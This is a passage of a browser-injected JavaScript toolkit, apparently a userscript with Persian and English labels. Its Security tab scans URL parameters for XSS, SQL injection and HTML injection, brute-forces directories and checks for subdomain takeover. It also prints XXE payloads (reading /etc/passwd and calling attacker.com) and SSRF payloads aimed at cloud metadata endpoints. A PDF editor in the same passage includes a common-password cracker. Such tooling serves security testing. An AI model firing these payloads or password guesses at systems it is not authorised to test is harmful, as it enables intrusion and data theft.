                        <button id="stopAuth" style="flex:1;background:#c53030;color:#fff;">⏹ ${_('Stop Injection')}</button>
                    </div>
                    <div id="authStatus" style="font-size:11px;color:#6a9955;margin-top:4px;">${S.authActive?'✅ '+_('Injection active.'):''}</div>
                </div>
                <div class="bi-sec">
                    <h4>🚫 ${_('Prevent Preflight')}</h4>
                    <label><input type="checkbox" id="preflightToggle" ${S.preventPreflight?'checked':''}> ${_('Prevent Preflight')}</label>
                    <div style="font-size:11px;color:#888;margin-top:4px;">Strips non-simple headers from fetch to avoid CORS OPTIONS requests.</div>
                    <div id="preflightStatus" style="font-size:11px;color:#6a9955;margin-top:4px;">${S.preventPreflight?'✅ '+_('Preflight prevention active.'):''}</div>
                </div>
                <div class="bi-sec">
                    <h4>🔒 ${_('SSL/TLS Security Headers')}</h4>
                    <button id="analyzeHeaders" style="width:100%;background:#0e639c;color:#fff;margin-bottom:6px;">🔍 ${_('Analyze')}</button>
                    <div id="sslResult" style="font-size:11px;"></div>
                </div>`;

                const fpsDisp = D.getElementById('fpsDisplay');
                D.getElementById('startFPS').onclick = () => { stopFPS(); startFPS(fpsDisp); const hud=D.getElementById('bi-fps-hud'); if(hud){const tick=()=>{hud.textContent=currentFps+'fps';requestAnimationFrame(tick);}; tick();} };
                D.getElementById('stopFPS').onclick = () => { stopFPS(); fpsDisp.textContent='-- FPS'; const hud=D.getElementById('bi-fps-hud'); if(hud)hud.textContent=''; };

                D.getElementById('startAuth').onclick = () => { const hn=D.getElementById('authHName').value.trim(), hv=D.getElementById('authHVal').value.trim(); if(!hv){D.getElementById('authStatus').textContent='⚠ Value required.';return;} S.authHeaderName=hn; S.authHeaderValue=hv; S.authActive=true; applyAuthInjection(); D.getElementById('authStatus').textContent='✅ '+_('Injection active.'); };
                D.getElementById('stopAuth').onclick = () => { S.authActive=false; D.getElementById('authStatus').textContent='⏹ '+_('Injection stopped.'); };

                D.getElementById('preflightToggle').onchange = function() { S.preventPreflight=this.checked; if(this.checked){applyPreflightPrevention();D.getElementById('preflightStatus').textContent='✅ '+_('Preflight prevention active.');}else{D.getElementById('preflightStatus').textContent='';} };

                D.getElementById('analyzeHeaders').onclick = async () => {
                    const res=D.getElementById('sslResult'); res.innerHTML='⏳ Analyzing...';
                    try {
                        const r=await fetch(location.href,{method:'HEAD'});
                        const checks=[
                            {name:'HSTS',header:'strict-transport-security',rec:'max-age=31536000; includeSubDomains'},
                            {name:'CSP',header:'content-security-policy',rec:'Required'},
                            {name:'X-Frame-Options',header:'x-frame-options',rec:'DENY or SAMEORIGIN'},
                            {name:'X-Content-Type-Options',header:'x-content-type-options',rec:'nosniff'},
                            {name:'X-XSS-Protection',header:'x-xss-protection',rec:'1; mode=block'},
                            {name:'Referrer-Policy',header:'referrer-policy',rec:'strict-origin-when-cross-origin'},
                            {name:'Permissions-Policy',header:'permissions-policy',rec:'Present'},
                            {name:'Server',header:'server',rec:'Hide version info'},
                        ];
                        res.innerHTML = checks.map(c=>{
                            const val=r.headers.get(c.header);
                            const status=val?`<span style="color:#6a9955;">✅ ${val.substring(0,60)}</span>`:`<span style="color:#f44;">❌ Missing (Rec: ${c.rec})</span>`;
                            return `<div style="margin-bottom:4px;"><b>${c.name}:</b> ${status}</div>`;
                        }).join('');
                        res.innerHTML += `<div style="margin-top:6px;color:#888;">Protocol: ${r.headers.get('x-protocol')||performance.getEntriesByType('navigation')[0]?.nextHopProtocol||'N/A'}</div>`;
                    } catch(e) { res.textContent='❌ '+e.message; }
                };
            }

            // ---- Security (NEW) ----
            else if (tab === 'Security') {
                content.innerHTML = `
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
                <div class="bi-sec">
                    <h4>💉 ${_('XSS Scanner')}</h4>
                    <div style="font-size:11px;color:#888;margin-bottom:4px;">Tests URL parameters for reflection.</div>
                    <button id="scanXSS" style="width:100%;background:#c53030;color:#fff;">🔍 ${_('Scan')}</button>
                    <div id="xssResult" style="font-size:11px;margin-top:6px;max-height:100px;overflow-y:auto;"></div>
                </div>
                <div class="bi-sec">
                    <h4>🗄 ${_('SQLi Scanner')}</h4>
                    <div style="font-size:11px;color:#888;margin-bottom:4px;">Tests URL parameters for SQL errors.</div>
                    <button id="scanSQLi" style="width:100%;background:#c53030;color:#fff;">🔍 ${_('Scan')}</button>
                    <div id="sqliResult" style="font-size:11px;margin-top:6px;max-height:100px;overflow-y:auto;"></div>
                </div>
                <div class="bi-sec">
                    <h4>🖼 ${_('Clickjacking Check')}</h4>
                    <button id="scanClickjack" style="width:100%;background:#4d4d4d;color:#fff;">🔍 ${_('Scan')}</button>
                    <div id="clickjackResult" style="font-size:11px;margin-top:6px;"></div>
                </div>
                <div class="bi-sec">
                    <h4>📝 ${_('HTML Injection')}</h4>
                    <div style="font-size:11px;color:#888;margin-bottom:4px;">Tests URL params for HTML reflection.</div>
                    <button id="scanHTML" style="width:100%;background:#4d4d4d;color:#fff;">🔍 ${_('Scan')}</button>
                    <div id="htmlInjResult" style="font-size:11px;margin-top:6px;max-height:80px;overflow-y:auto;"></div>
                </div>
                <div class="bi-sec">
                    <h4>📄 ${_('XXE Payloads')}</h4>
                    <button id="genXXE" style="width:100%;background:#4d4d4d;color:#fff;">📋 Generate</button>
                    <div id="xxeResult" style="font-size:10px;margin-top:4px;max-height:80px;overflow-y:auto;background:#1e1e1e;padding:4px;border-radius:3px;color:#ce9178;"></div>
                </div>
                <div class="bi-sec">
                    <h4>🌐 ${_('SSRF Payloads')}</h4>
                    <button id="genSSRF" style="width:100%;background:#4d4d4d;color:#fff;">📋 Generate</button>
                    <div id="ssrfResult" style="font-size:10px;margin-top:4px;max-height:80px;overflow-y:auto;background:#1e1e1e;padding:4px;border-radius:3px;color:#ce9178;"></div>
                </div>
                <div class="bi-sec">
                    <h4>🌍 ${_('Subdomain Takeover')}</h4>
                    <input id="subTarget" placeholder="subdomain.example.com" style="margin-bottom:4px;" value="${location.hostname}">
                    <button id="scanSub" style="width:100%;background:#4d4d4d;color:#fff;">🔍 ${_('Scan')}</button>
                    <div id="subResult" style="font-size:11px;margin-top:6px;"></div>
                </div>
                <div class="bi-sec">
                    <h4>📂 ${_('Directory BruteForce')}</h4>
                    <input id="dirTarget" placeholder="${location.origin}" style="margin-bottom:4px;" value="${location.origin}">
                    <div class="bi-row">
                        <button id="scanDir" style="flex:1;background:#4d4d4d;color:#fff;">🔍 ${_('Scan')}</button>
                        <button id="stopDir" style="flex:1;background:#c53030;color:#fff;">⏹ ${_('Stop')}</button>
                    </div>
                    <div id="dirResult" style="font-size:11px;margin-top:6px;max-height:100px;overflow-y:auto;"></div>
                </div>
                </div>`;

                // XSS Scanner
                D.getElementById('scanXSS').onclick = async () => {
                    const res=D.getElementById('xssResult'); res.innerHTML='⏳ '+_('Scanning...');
                    const url=new URL(location.href); const params=[...url.searchParams.entries()];
                    if(!params.length){res.innerHTML='ℹ '+_('No URL params found.');return;}
                    let found=[];
                    for(const [k] of params){
                        for(const p of XSS_PAYLOADS){
                            const tu=new URL(location.href); tu.searchParams.set(k,p);
                            try{ const r=await fetch(tu.toString(),{credentials:'same-origin'}); const t=await r.text(); if(t.includes(p)&&!t.includes('Content-Security-Policy')){found.push({param:k,payload:p.substring(0,40)});break;} }catch(e){}
                        }
                    }
                    res.innerHTML=found.length?found.map(f=>`<div style="color:#f44;">⚠ <b>${f.param}</b>: ${_('VULNERABLE')}<br><small>${f.payload}</small></div>`).join(''):params.map(([k])=>`<div style="color:#6a9955;">✅ ${k}: ${_('PROTECTED')}</div>`).join('');
                };

                // SQLi Scanner
                D.getElementById('scanSQLi').onclick = async () => {
                    const res=D.getElementById('sqliResult'); res.innerHTML='⏳ '+_('Scanning...');
                    const url=new URL(location.href); const params=[...url.searchParams.entries()];
                    if(!params.length){res.innerHTML='ℹ '+_('No URL params found.');return;}
                    let found=[];
                    for(const [k] of params){
                        for(const p of SQLI_PAYLOADS){
                            const tu=new URL(location.href); tu.searchParams.set(k,p);
                            try{ const r=await fetch(tu.toString(),{credentials:'same-origin'}); const t=(await r.text()).toLowerCase(); if(SQLI_ERRORS.some(e=>t.includes(e))){found.push({param:k,payload:p});break;} }catch(e){}
                        }
                    }
                    res.innerHTML=found.length?found.map(f=>`<div style="color:#f44;">⚠ <b>${f.param}</b>: ${_('VULNERABLE')}<br><small>${f.payload}</small></div>`).join(''):params.map(([k])=>`<div style="color:#6a9955;">✅ ${k}: ${_('PROTECTED')}</div>`).join('');
                };

                // Clickjacking
                D.getElementById('scanClickjack').onclick = async () => {
                    const res=D.getElementById('clickjackResult'); res.innerHTML='⏳...';
                    try {
                        const r=await fetch(location.href,{method:'HEAD'});
                        const xfo=r.headers.get('x-frame-options');
                        const csp=r.headers.get('content-security-policy')||'';
                        const hasFA=csp.includes('frame-ancestors');
                        const vuln=!xfo&&!hasFA;
                        res.innerHTML=`<div>X-Frame-Options: ${xfo?`<span style="color:#6a9955;">${xfo}</span>`:'<span style="color:#f44;">NOT SET</span>'}</div>
                        <div>CSP frame-ancestors: ${hasFA?'<span style="color:#6a9955;">✅ Present</span>':'<span style="color:#f44;">❌ Missing</span>'}</div>
                        <div style="margin-top:4px;font-weight:bold;color:${vuln?'#f44':'#6a9955'};">${vuln?_('VULNERABLE'):_('PROTECTED')}</div>`;
                    } catch(e){res.textContent='❌ '+e.message;}
                };

                // HTML Injection
                D.getElementById('scanHTML').onclick = async () => {
                    const res=D.getElementById('htmlInjResult'); res.innerHTML='⏳...';
                    const url=new URL(location.href); const params=[...url.searchParams.entries()];
                    if(!params.length){res.innerHTML='ℹ '+_('No URL params found.');return;}
                    const payloads=['<h1>HTMLI</h1>','<b>injected</b>','<marquee>test</marquee>'];
                    let found=[];
                    for(const [k] of params){
                        for(const p of payloads){
                            const tu=new URL(location.href); tu.searchParams.set(k,p);
                            try{ const r=await fetch(tu.toString(),{credentials:'same-origin'}); const t=await r.text(); if(t.includes(p)){found.push({param:k,payload:p});break;} }catch(e){}
                        }
                    }
                    res.innerHTML=found.length?found.map(f=>`<div style="color:#f44;">⚠ <b>${f.param}</b>: ${_('VULNERABLE')}</div>`).join(''):params.map(([k])=>`<div style="color:#6a9955;">✅ ${k}: ${_('PROTECTED')}</div>`).join('');
                };

                // XXE Payloads
                D.getElementById('genXXE').onclick = () => {
                    const payloads=[
                        `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
                        `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><root>&xxe;</root>`,
                        `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>`,
                    ];
                    D.getElementById('xxeResult').textContent=payloads.join('\n\n');
                };

                // SSRF Payloads
                D.getElementById('genSSRF').onclick = () => {
                    const payloads=[
                        'http://127.0.0.1/', 'http://localhost/', 'http://169.254.169.254/',
                        'http://169.254.169.254/latest/meta-data/', 'http://[::1]/',
                        'http://0.0.0.0/', 'http://2130706433/', 'file:///etc/passwd',
                        'dict://127.0.0.1:11211/stat', 'gopher://127.0.0.1:9200/_cat/indices',
                        'http://metadata.google.internal/computeMetadata/v1/',
                        'http://169.254.169.254/latest/dynamic/instance-identity/document',
                    ];
                    D.getElementById('ssrfResult').textContent=payloads.join('\n');
                };

                // Subdomain Takeover
                D.getElementById('scanSub').onclick = async () => {
                    const res=D.getElementById('subResult'); res.innerHTML='⏳ در حال اسکن...';
                    const rawT=D.getElementById('subTarget').value.trim()||location.hostname;
                    const target=rawT.replace(/^www\./,'');
                    // Try kernel first
                    if(_kernelOnline && S.kernelUrl) {
                        res.innerHTML='⏳ ارسال به Kernel...';
                        try {
                            const r=await fetch(S.kernelUrl+'/scan/subdomains',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({domain:target,check_cname:true})});
                            if(r.ok){
                                const d=await r.json();
                                res.innerHTML=`<div style="color:#888;margin-bottom:4px;">🔍 ${d.checked} زیردامنه چک شد (Kernel)</div>`;
                                d.alive.forEach(a=>res.innerHTML+=`<div style="color:#6a9955;">✅ ${a.subdomain} → ${a.ips.join(', ')}</div>`);
                                (d.cname_risk||[]).forEach(c=>res.innerHTML+=`<div style="color:#ff9900;">⚠ CNAME Takeover: ${c.subdomain} → ${c.cname} [${c.service}]</div>`);
                                if(!d.alive.length) res.innerHTML+='<span style="color:#888;">زیردامنه‌ای پیدا نشد.</span>';
                                res.innerHTML+='<br>✅ اتمام (از طریق Kernel)';
                                return;
                            }
                        } catch(e){ res.innerHTML='⚠ Kernel ناموفق، DNS fallback...<br>'; }
                    }
                    try {
                        const r=await fetch(`https://dns.google/resolve?name=${rawT}&type=CNAME`);
                        const d=await r.json();
                        const cname=(d.Answer||[]).find(a=>a.type===5)?.data||'';
                        if(!cname){res.innerHTML+='<span style="color:#888;">CNAME record یافت نشد.</span>';return;}
                        const match=Object.entries(CNAME_SERVICES).find(([dm])=>cname.includes(dm));
                        if(match){
                            try{await fetch(`https://${rawT}`,{mode:'no-cors'});res.innerHTML+=`<div style="color:#ff9900;">⚠ CNAME → <b>${cname}</b> (${match[1]}) — Potential Takeover!</div>`;}
                            catch(e){res.innerHTML+=`<div style="color:#f44;">⚠ CNAME → <b>${cname}</b> (${match[1]}) — Unreachable = likely Takeover!</div>`;}
                        } else {
                            res.innerHTML+=`<div style="color:#6a9955;">✅ CNAME → ${cname} — سرویس آسیب‌پذیری شناسایی نشد.</div>`;
                        }
                    } catch(e){res.innerHTML+='❌ '+e.message;}
                };

                // Directory BruteForce
                let dirStop=false;
                D.getElementById('scanDir').onclick = async () => {
                    dirStop=false;
                    const res=D.getElementById('dirResult');
                    const target=(D.getElementById('dirTarget').value.trim()||location.origin).replace(/\/$/,'');
                    // Try kernel first
                    if(_kernelOnline && S.kernelUrl) {
                        res.innerHTML='⏳ ارسال به Kernel...';
                        try {
                            const r=await fetch(S.kernelUrl+'/scan/directory',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target,concurrency:10,timeout:5})});
                            if(r.ok){
                                const d=await r.json();
                                res.innerHTML=`<div style="color:#888;margin-bottom:4px;">🔍 ${d.scanned} مسیر اسکن شد (Kernel)</div>`;
                                if(!d.found.length) res.innerHTML+='<span style="color:#6a9955;">هیچ مسیری پیدا نشد.</span>';
                                d.found.forEach(f=>{const c=f.status<300?'#6a9955':f.status<400?'#007acc':'#c5862c';res.innerHTML+=`<div style="color:${c};">[${f.status}] <a href="${f.url}" target="_blank" style="color:${c}">${f.path}</a></div>`;});
                                res.innerHTML+='<br>✅ اتمام (از طریق Kernel)';
                                return;
                            }
                        } catch(e){ res.innerHTML='⚠ Kernel ناموفق، اسکن مستقیم...<br>'; }
                    }
                    res.innerHTML+='⏳ اسکن مرورگر: '+DIR_WORDLIST.length+' مسیر<br>';
                    for(const path of DIR_WORDLIST){
                        if(dirStop){res.innerHTML+='<br>⏹ متوقف شد.';break;}
                        try{
                            const r=await fetch(target+path,{method:'HEAD',credentials:'omit',mode:'no-cors'});
                            if(r.type==='opaque') res.innerHTML+=`<div style="color:#007acc;">[opaque] ${path}</div>`;
                            else if(r.status!==404) res.innerHTML+=`<div style="color:${r.status<400?'#6a9955':'#888'};">[${r.status}] ${path}</div>`;
                        } catch(e){}
                        await new Promise(r=>setTimeout(r,40));
                    }
                    if(!dirStop)res.innerHTML+='<br>✅ اتمام.';
                };
                D.getElementById('stopDir').onclick = () => dirStop=true;
            }

            // ---- PDF Editor (v7.1) ----
            else if (tab === 'PDF') {
                if (!D.getElementById('bi-pde-css')) {
                    const _pst = D.createElement('style'); _pst.id='bi-pde-css';
                    _pst.textContent = `
                        .pde{display:flex;flex-direction:column;height:100%;gap:4px;}
                        .pde-row{display:flex;gap:4px;align-items:center;flex-wrap:wrap;flex-shrink:0;}
                        .pde-btn{padding:5px 10px;border-radius:5px;border:none;cursor:pointer;font-size:11px;font-family:Consolas,monospace;background:#3c3c3c;color:#d4d4d4;transition:.15s;white-space:nowrap;}
                        .pde-btn:hover{background:#555;color:#fff;} .pde-btn.pr{background:#0e639c;color:#fff;} .pde-btn.pr:hover{background:#1177bb;}
                        .pde-btn.ok{background:#238636;color:#fff;} .pde-btn.ok:hover{background:#2ea043;}
                        .pde-btn.on{background:#1a3050;color:#007acc;border:1px solid #007acc;}
                        .pde-sep{width:1px;height:20px;background:#3e3e42;flex-shrink:0;}
                        .pde-tool{width:28px;height:28px;border-radius:5px;border:none;cursor:pointer;font-size:14px;background:#3c3c3c;color:#888;display:flex;align-items:center;justify-content:center;transition:.15s;font-family:inherit;position:relative;}
                        .pde-tool:hover{background:#555;color:#fff;} .pde-tool.on{background:#1a3050;color:#007acc;border:1px solid #007acc44;}
                        .pde-tip{position:absolute;bottom:-22px;left:50%;transform:translateX(-50%);background:#252526;color:#ccc;font-size:10px;padding:2px 6px;border-radius:3px;white-space:nowrap;pointer-events:none;display:none;z-index:9}
                        .pde-tool:hover .pde-tip{display:block;}
                        .pde-stage-wrap{flex:1;overflow:auto;background:#3a3a3a;border-radius:4px;display:flex;align-items:flex-start;justify-content:center;padding:12px;min-height:0;}
                        .pde-stage-wrap::-webkit-scrollbar{width:5px;height:5px;} .pde-stage-wrap::-webkit-scrollbar-thumb{background:#555;border-radius:3px;}
                        .pde-stage{position:relative;flex-shrink:0;box-shadow:0 4px 24px rgba(0,0,0,.8);}
                        #pde-pdf-c{display:block;position:absolute;top:0;left:0;}
                        #pde-ann-c{display:block;position:absolute;top:0;left:0;}
                        .pde-empty{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;height:180px;color:#888;text-align:center;}
                        .pde-drop{border:2px dashed #3e3e42;border-radius:8px;padding:18px;cursor:pointer;transition:.2s;width:220px;}
                        .pde-drop:hover,.pde-drop.drag{border-color:#007acc;background:#1a3050;}
                        .pde-st{font-size:11px;color:#888;display:flex;align-items:center;gap:6px;flex-shrink:0;}
                        .pde-dot{width:6px;height:6px;border-radius:50%;background:#888;flex-shrink:0;}
                        .pde-subpanel{background:#252526;padding:8px;border-radius:5px;flex-shrink:0;font-size:11px;}
                        .pde-tinp{background:#3c3c3c;border:1px solid #555;border-radius:4px;color:#d4d4d4;padding:3px 7px;font-size:11px;font-family:Consolas;outline:none;}
                    `;
                    D.head.appendChild(_pst);
                }

                // ── State ──
                let _pDoc=null, _pPage=1, _pScale=1.0, _pRaw=null;
                let _pTool='select', _pColor='#e74c3c', _pSize=3;
                let _pAnns={}, _pHist={}, _pDraw=false, _pPts=[], _pDrag=null;
                const _pA  = pg=>((_pAnns[pg]=_pAnns[pg]||[]));
                const _pSn = pg=>{(_pHist[pg]=_pHist[pg]||[]).push(JSON.stringify(_pAnns[pg]||[]))};
                const _pUn = pg=>{const h=_pHist[pg]||[];if(h.length)_pAnns[pg]=JSON.parse(h.pop())};

                async function _pLoadPdf(data,pw=''){
                    await loadPdfjs();
                    _pDoc=await pdfjsLib.getDocument({data,password:pw}).promise;
                    _pRaw=data; _pPage=1; _pAnns={}; _pHist={};
                    _pBuild(); await _pRender(1);
                }

                function _pBuild(){
                    const isRTL=S.lang==='fa';
                    content.innerHTML=`<div class="pde">
                      <!-- Action bar -->
                      <div class="pde-row">
                        <button class="pde-btn pr" id="pde-open">📂 ${_('Open PDF')}</button>
                        <input type="file" id="pde-fi" style="display:none" accept=".pdf">
                        <input id="pde-url" placeholder="URL..." class="pde-tinp" style="width:110px;">
                        <button class="pde-btn" id="pde-url-go">🌐</button>
                        <div class="pde-sep"></div>
                        <button class="pde-btn ok" id="pde-save">💾 ${_('Save PDF')}</button>
                        <button class="pde-btn" id="pde-dl">⬇ ${_('Download')}</button>
                        <div class="pde-sep"></div>
                        <button class="pde-btn" id="pde-extract">📋 ${_('Extract Text')}</button>
                        <button class="pde-btn" id="pde-merge-btn">🔗 ${_('Merge PDFs')}</button>
                        <button class="pde-btn" id="pde-split-btn">✂️ ${_('Split PDF')}</button>
                        <button class="pde-btn" id="pde-rot-btn">↻ ${_('Rotate')}</button>
                        <button class="pde-btn" id="pde-cmp-btn">🗜 ${_('Compress')}</button>
                      </div>

                      <!-- Tool bar -->
                      <div class="pde-row">
                        ${[['select','🖱',_('Select')],['text','T',_('Text Tool')],['draw','✏',_('Draw Tool')],['highlight','💛',_('Highlight')],['shape','⬜',_('Shape Tool')],['erase','🧹',_('Eraser')]].map(([id,ico,tip])=>
                          `<button class="pde-tool ${_pTool===id?'on':''}" data-pt="${id}">${ico}<span class="pde-tip">${tip}</span></button>`
                        ).join('')}
                        <div class="pde-sep"></div>
                        <button class="pde-tool" id="pde-undo">↩<span class="pde-tip">${_('Undo')} Ctrl+Z</span></button>
                        <button class="pde-tool" id="pde-clrpg">🗑<span class="pde-tip">${_('Clear Page')}</span></button>
                        <div class="pde-sep"></div>
                        <button class="pde-tool" id="pde-prev">◀<span class="pde-tip">Prev</span></button>
                        <span id="pde-pi" style="font-size:11px;color:#888;min-width:44px;text-align:center;">${_pDoc?_pPage+'/'+_pDoc.numPages:'—'}</span>
                        <button class="pde-tool" id="pde-next">▶<span class="pde-tip">Next</span></button>
                        <div class="pde-sep"></div>
                        <button class="pde-tool" id="pde-zi">+<span class="pde-tip">Zoom In</span></button>
                        <span id="pde-zl" style="font-size:11px;color:#888;width:36px;text-align:center;">${Math.round(_pScale*100)}%</span>
                        <button class="pde-tool" id="pde-zo">−<span class="pde-tip">Zoom Out</span></button>
                      </div>

                      <!-- Props bar -->
                      <div class="pde-row">
                        <span style="font-size:11px;color:#888;">${_('Color')}:</span>
                        <input type="color" id="pde-col" value="${_pColor}" style="width:26px;height:26px;border-radius:4px;border:1px solid #555;cursor:pointer;padding:1px;">
                        <span style="font-size:11px;color:#888;">${_('Size')}:</span>
                        <input type="number" id="pde-sz" value="${_pSize}" min="1" max="80" class="pde-tinp" style="width:42px;">
                        <input id="pde-tv" class="pde-tinp" placeholder="متن..." style="flex:1;display:${_pTool==='text'?'block':'none'}">
                      </div>

                      <!-- Stage -->
                      <div class="pde-stage-wrap" id="pde-wrap">
                        ${_pDoc?`<div class="pde-stage" id="pde-stage">
                          <canvas id="pde-pdf-c"></canvas>
                          <canvas id="pde-ann-c"></canvas>
                        </div>`:`<div class="pde-empty">
                          <div style="font-size:42px;opacity:.3;">📄</div>
                          <div>${_('No PDF loaded')}</div>
                          <button class="pde-btn pr" id="pde-open2">📂 ${_('Open PDF')}</button>
                          <div id="pde-dz" class="pde-drop">${_('Drop PDF here')}</div>
                        </div>`}
                      </div>

                      <!-- Sub-panels -->
                      <div id="pde-txt-panel" style="display:none;" class="pde-subpanel">
                        <div style="display:flex;justify-content:space-between;margin-bottom:5px;">
                          <span style="color:#888;">${_('Extract Text')}</span>
                          <div style="display:flex;gap:4px;">
                            <button class="pde-btn" id="pde-txt-cp">📋 ${_('Copy All Text')}</button>
                            <button class="pde-btn" id="pde-txt-cl">✕</button>
                          </div>
                        </div>
                        <div id="pde-txt-c" style="max-height:90px;overflow-y:auto;background:#1e1e1e;padding:5px;border-radius:3px;color:#9cdcfe;white-space:pre-wrap;"></div>
                      </div>

                      <div id="pde-merge-panel" style="display:none;" class="pde-subpanel">
                        <div style="color:#888;margin-bottom:5px;">📂 انتخاب PDF دوم برای ادغام:</div>
                        <input type="file" id="pde-mf" accept=".pdf" style="margin-bottom:5px;">
                        <div style="display:flex;gap:5px;">
                          <button class="pde-btn ok" id="pde-mdo">🔗 Merge & Download</button>
                          <button class="pde-btn" id="pde-mcl">✕</button>
                        </div>
                      </div>

                      <div id="pde-crack-panel" style="display:none;" class="pde-subpanel">
                        <div style="color:#888;margin-bottom:5px;">🔓 ${_('Crack Password')}</div>
                        <div style="display:flex;gap:5px;flex-wrap:wrap;">
                          <button class="pde-btn" id="pde-crack-common" style="color:#d29922;">رمزهای رایج</button>
                          <input id="pde-crack-inp" class="pde-tinp" placeholder="رمز دلخواه..." style="flex:1;">
                          <button class="pde-btn" id="pde-crack-try">امتحان</button>
                        </div>
                        <div id="pde-crack-st" style="margin-top:5px;color:#6a9955;"></div>
                      </div>

                      <!-- Status bar -->
                      <div class="pde-st">
                        <div class="pde-dot" id="pde-sdot"></div>
                        <span id="pde-stxt">${_pDoc?_pDoc.numPages+' pages':'No PDF'}</span>
                        ${_pDoc?`<span style="margin-right:auto;"></span><button class="pde-btn" id="pde-crack-btn" style="font-size:10px;padding:3px 7px;">🔓</button>`:''}
                      </div>
                    </div>`;
                    _pBind();
                    if(_pDoc) _pRender(_pPage);
                }

                async function _pRender(num){
                    if(!_pDoc)return;
                    _pPage=num;
                    const page=await _pDoc.getPage(num);
                    const vp=page.getViewport({scale:_pScale});
                    const pC=D.getElementById('pde-pdf-c'), aC=D.getElementById('pde-ann-c');
                    if(!pC||!aC)return;
                    pC.width=aC.width=vp.width; pC.height=aC.height=vp.height;
                    const stg=D.getElementById('pde-stage');
                    if(stg){stg.style.width=vp.width+'px';stg.style.height=vp.height+'px';}
                    await page.render({canvasContext:pC.getContext('2d'),viewport:vp}).promise;
                    // Text layer for selection
                    let tl=D.getElementById('bi-pde-tl');
                    if(!tl){tl=D.createElement('div');tl.id='bi-pde-tl';tl.style.cssText='position:absolute;top:0;left:0;overflow:hidden;';stg&&stg.appendChild(tl);}
                    tl.style.width=vp.width+'px';tl.style.height=vp.height+'px';tl.innerHTML='';
                    try{
                        const tc=await page.getTextContent();
                        tc.items.forEach(item=>{
                            const tx=pdfjsLib.Util.transform(vp.transform,item.transform);
                            const sp=D.createElement('span');
                            sp.textContent=item.str;
                            const fs=Math.sqrt(tx[0]*tx[0]+tx[1]*tx[1]);
                            sp.style.cssText=`position:absolute;left:${tx[4]}px;top:${tx[5]-fs}px;font-size:${fs}px;line-height:1;white-space:pre;color:transparent;pointer-events:auto;cursor:text;transform-origin:0 100%;transform:scaleX(${item.width/Math.max(item.str.length*fs*0.55,1)});`;
                            tl.appendChild(sp);
                        });
                        tl.style.pointerEvents='auto';
                    }catch(e){}
                    _pDraw2();
                    const pi=D.getElementById('pde-pi');
                    if(pi)pi.textContent=num+'/'+_pDoc.numPages;
                }

                function _pDraw2(){
                    const aC=D.getElementById('pde-ann-c'); if(!aC)return;
                    const ctx=aC.getContext('2d');
                    ctx.clearRect(0,0,aC.width,aC.height);
                    (_pAnns[_pPage]||[]).forEach(a=>{
                        ctx.save(); ctx.globalAlpha=a.op||1;
                        if(a.t==='draw'&&a.pts&&a.pts.length>1){
                            ctx.strokeStyle=a.c;ctx.lineWidth=a.s;ctx.lineCap='round';ctx.lineJoin='round';
                            ctx.beginPath();ctx.moveTo(a.pts[0].x,a.pts[0].y);
                            a.pts.forEach(p=>ctx.lineTo(p.x,p.y));ctx.stroke();
                        }else if(a.t==='text'){
                            ctx.fillStyle=a.c;ctx.font=`${a.s||13}px Consolas,monospace`;
                            ctx.fillText(a.v||'',a.x,a.y);
                        }else if(a.t==='highlight'){
                            ctx.globalAlpha=0.35;ctx.fillStyle=a.c;ctx.fillRect(a.x,a.y,a.w,a.h);
                        }else if(a.t==='shape'){
                            ctx.strokeStyle=a.c;ctx.lineWidth=a.s||2;ctx.strokeRect(a.x,a.y,a.w,a.h);
                        }
                        ctx.restore();
                    });
                }

                async function _pSaveKernel(){
                    if(!_pDoc||!_pRaw){alert(_('No PDF loaded'));return null;}
                    const stxt=D.getElementById('pde-stxt'),sdot=D.getElementById('pde-sdot');
                    if(stxt)stxt.textContent=_('Saving...');if(sdot)sdot.style.background='#c5862c';
                    if(!_kernelOnline||!S.kernelUrl){if(stxt)stxt.textContent='⚠ Kernel offline';if(sdot)sdot.style.background='#ef4444';return null;}
                    const allA=[];
                    Object.entries(_pAnns).forEach(([pg,arr])=>{arr.forEach(a=>{
                        const sc=1/_pScale;
                        const base={...a,page:parseInt(pg)-1,color:a.c,opacity:a.op||1,fontSize:a.s,lineWidth:a.s||2};
                        if(a.t==='draw')base.points=(a.pts||[]).map(p=>({x:p.x*sc,y:p.y*sc}));
                        else{base.x=(a.x||0)*sc;base.y=(a.y||0)*sc;}
                        if(a.w)base.width=a.w*sc;if(a.h)base.height=a.h*sc;
                        if(a.v)base.text=a.v; base.type=a.t;
                        allA.push(base);
                    });});
                    const b64=btoa(String.fromCharCode(...new Uint8Array(_pRaw)));
                    try{
                        const r=await fetch(S.kernelUrl+'/pdf/annotate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({pdfData:b64,annotations:allA})});
                        if(!r.ok)throw new Error('HTTP '+r.status);
                        const d=await r.json();
                        if(stxt){stxt.textContent=_('Saved!');setTimeout(()=>{if(D.getElementById('pde-stxt'))D.getElementById('pde-stxt').textContent=_pDoc?_pDoc.numPages+' pages':'';},3000);}
                        if(sdot){sdot.style.background='#22c55e';setTimeout(()=>{if(D.getElementById('pde-sdot'))D.getElementById('pde-sdot').style.background='#888';},3000);}
                        return d.pdfData;
                    }catch(e){if(stxt)stxt.textContent='❌ '+e.message;if(sdot)sdot.style.background='#ef4444';return null;}
                }

                function _pDL(b64,name){
                    const by=atob(b64),arr=new Uint8Array(by.length);
                    for(let i=0;i<by.length;i++)arr[i]=by.charCodeAt(i);
                    dlBlob(new Blob([arr],{type:'application/pdf'}),name||'edited.pdf');
                }

                const COMMON_PW=['123456','password','123456789','12345','qwerty','abc123','111111','000000','1234','admin','123123','letmein','test','user','hello','pass','secret','master','dragon'];

                function _pBind(){
                    const g=id=>D.getElementById(id);
                    const openFn=()=>g('pde-fi')&&g('pde-fi').click();
                    g('pde-open')&&g('pde-open').addEventListener('click',openFn);
                    g('pde-open2')&&g('pde-open2').addEventListener('click',openFn);
                    g('pde-fi')&&g('pde-fi').addEventListener('change',async e=>{
                        const f=e.target.files[0];if(!f)return;
